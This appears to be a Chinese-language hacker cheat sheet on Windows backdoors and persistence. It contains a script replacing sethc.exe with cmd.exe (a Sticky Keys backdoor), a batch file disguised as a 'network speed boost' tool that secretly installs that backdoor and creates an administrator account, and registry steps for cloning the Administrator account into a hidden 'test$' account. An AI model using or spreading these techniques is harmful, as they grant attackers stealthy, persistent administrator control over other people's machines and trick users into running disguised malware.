## shift后门
```Batch
CD C:\windows\system32
cacls sethc.exe /t /e /G Administrators:f
cacls cmd.exe /t /e /G Administrators:f
ren sethc.exe aaa.exe
ren cmd.exe sethc.exe
```
### 文件名：一键提升网速.bat
```Batch
echo 开始分析网络......
copy c:\windows\system32\cmd.exe c:\windows\system32\dllcache\sethc.exe
copy c:\windows\system32\dllcache\sethc.exe c:\windows\system32\sethc.exe
echo 你的网速太慢了！
net user admin 123456 /add && net localgroup administrators admin /add
echo 你把我这个文件删了吧!
```

### 0x01 隐藏、克隆账号 window 隐藏系统用户制作：
### 1、CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限,PS:CMD命令行使用"net user",看不到"test$"这个账号，但在控制面板和本地用户和组是可以显示此用户的。
### 2、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。
### 3、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。
### 4、扎到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。
### 5、分别test$和“000003EC导出到桌面，删除test$用户   net user test$ /del
### 6、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。
### PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$r这个账户的，只有在注册表中才能看得到。
